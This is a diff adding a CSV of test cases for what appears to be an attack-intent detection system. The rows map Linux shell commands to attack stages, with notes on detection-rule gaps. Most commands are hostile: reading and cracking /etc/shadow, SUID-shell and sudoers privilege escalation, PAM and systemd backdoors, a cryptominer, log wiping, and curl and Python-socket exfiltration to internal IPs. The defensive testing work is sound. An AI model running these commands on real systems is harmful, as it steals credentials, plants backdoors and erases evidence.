@@ -1,0 +1,29 @@
+test_id,case_type,expected_intent,expected_attack_stage,scenario,event_type,command
+TC-U-CRED-01,A,CREDENTIAL_ACCESS,CREDENTIAL_ACCESS,[A] awk to read /etc/shadow fields - credential dump without cat,command_input,"awk -F: '{print $1,$2}' /etc/shadow"
+TC-U-CRED-02,A,CREDENTIAL_ACCESS,CREDENTIAL_ACCESS,[A] john password cracker invocation - unseen tool,command_input,john --wordlist=/tmp/rockyou.txt /tmp/shadow_hashes.txt
+TC-U-CRED-03,A,CREDENTIAL_ACCESS,CREDENTIAL_ACCESS,[A] Python script reading /etc/shadow directly,command_input,"python3 -c ""print(open('/etc/shadow').read())"""
+TC-U-CRED-04,C,CREDENTIAL_ACCESS,CREDENTIAL_ACCESS,[C] find *.pem -- matches RULE_DISC_01 but intent is credential theft,command_input,find / -name '*.pem' -o -name '*.key' 2>/dev/null
+TC-U-RECON-01,A,RECONNAISSANCE,RECONNAISSANCE,[A] cat /proc/version - kernel info via /proc not covered by RECON rule,command_input,cat /proc/version
+TC-U-RECON-02,A,RECONNAISSANCE,RECONNAISSANCE,[A] systemctl list-units to enumerate running services,command_input,systemctl list-units --type=service --state=running
+TC-U-RECON-03,A,RECONNAISSANCE,RECONNAISSANCE,"[A] env - environment variable enumeration (reveals paths, user, tokens)",command_input,env
+TC-U-RECON-04,B,RECONNAISSANCE,RECONNAISSANCE,[B] cat /proc/cpuinfo - partially matches DISC_01 proc/cpuinfo pattern,command_input,cat /proc/cpuinfo | grep -m1 'model name'
+TC-U-DISC-01,A,DISCOVERY,DISCOVERY,[A] lsof -i - list open network sockets (not in RULE_DISC_01),command_input,lsof -i -n -P
+TC-U-DISC-02,A,DISCOVERY,DISCOVERY,[A] dpkg -l to enumerate installed packages,command_input,dpkg -l | grep -E 'ssh|ftp|nc|nmap'
+TC-U-DISC-03,A,DISCOVERY,DISCOVERY,[A] df -h - disk space enumeration (not covered by any rule),command_input,df -h
+TC-U-DISC-04,A,DISCOVERY,DISCOVERY,[A] mount - enumerate filesystem mount points,command_input,mount | grep -v tmpfs
+TC-U-EXEC-01,A,EXECUTION,EXECUTION,[A] chmod +x then run local file - no wget/curl dropper,command_input,chmod +x /tmp/update.sh && /tmp/update.sh
+TC-U-EXEC-02,A,EXECUTION,EXECUTION,[A] PHP one-liner code execution via CLI,command_input,"php -r 'system(""id && cat /etc/passwd"");'"
+TC-U-EXEC-03,A,EXECUTION,EXECUTION,[A] nohup background execution of binary (cryptominer pattern),command_input,nohup /tmp/.x/miner -o stratum+tcp://pool.xmrminerpro.com:8080 &
+TC-U-PRIV-01,A,PRIVILEGE_ESCALATION,PRIVILEGE_ESCALATION,[A] chmod u+s on copied bash binary for SUID shell,command_input,cp /bin/bash /tmp/bash && chmod u+s /tmp/bash
+TC-U-PRIV-02,A,PRIVILEGE_ESCALATION,PRIVILEGE_ESCALATION,[A] echo into /etc/sudoers.d for passwordless sudo,command_input,echo 'hacker ALL=(ALL) NOPASSWD:ALL' > /etc/sudoers.d/hacker
+TC-U-PRIV-03,A,PRIVILEGE_ESCALATION,PRIVILEGE_ESCALATION,[A] visudo invocation (not sudo -l or su),command_input,visudo
+TC-U-PERS-01,A,PERSISTENCE,PERSISTENCE,[A] PAM backdoor via pam_exec.so module,command_input,echo 'session optional pam_exec.so /tmp/payload.sh' >> /etc/pam.d/common-auth
+TC-U-PERS-02,A,PERSISTENCE,PERSISTENCE,[A] systemd malicious service unit creation,command_input,printf '[Unit]\nDescription=system update\n[Service]\nExecStart=/tmp/evil\n[Install]\nWantedBy=multi-user.target' > /etc/systemd/system/sysupdate.service
+TC-U-PERS-03,A,PERSISTENCE,PERSISTENCE,[A] MOTD persistence via /etc/update-motd.d symlink,command_input,ln -sf /tmp/backdoor.sh /etc/update-motd.d/99-evil
+TC-U-EXFIL-01,A,EXFILTRATION,EXFILTRATION,[A] base64-encode /etc/shadow and curl-POST the encoded string,command_input,base64 /etc/shadow | curl -s -X POST -d @- http://10.0.0.99/collect
+TC-U-EXFIL-02,A,EXFILTRATION,EXFILTRATION,[A] Python direct file read over socket (not reverse shell),command_input,"python3 -c ""import socket; s=socket.socket(); s.connect(('10.0.0.1',9999)); s.send(open('/etc/passwd','rb').read()); s.close()"""
+TC-U-CLEAN-01,A,CLEANUP,CLEANUP,[A] symlink .bash_history to /dev/null (not rm or history -c),command_input,ln -sf /dev/null ~/.bash_history
+TC-U-CLEAN-02,A,CLEANUP,CLEANUP,[A] truncate auth.log and syslog to zero bytes,command_input,truncate -s0 /var/log/auth.log /var/log/syslog
+TC-U-CLEAN-03,A,CLEANUP,CLEANUP,[A] sed to delete attacker IP lines from auth log,command_input,sed -i '/192.168.1.200/d' /var/log/auth.log
+TC-U-OTHER-01,D,OTHER,UNKNOWN,[D] echo hello - benign shell output,command_input,echo hello
+TC-U-OTHER-02,D,OTHER,UNKNOWN,[D] date - benign date command,command_input,date
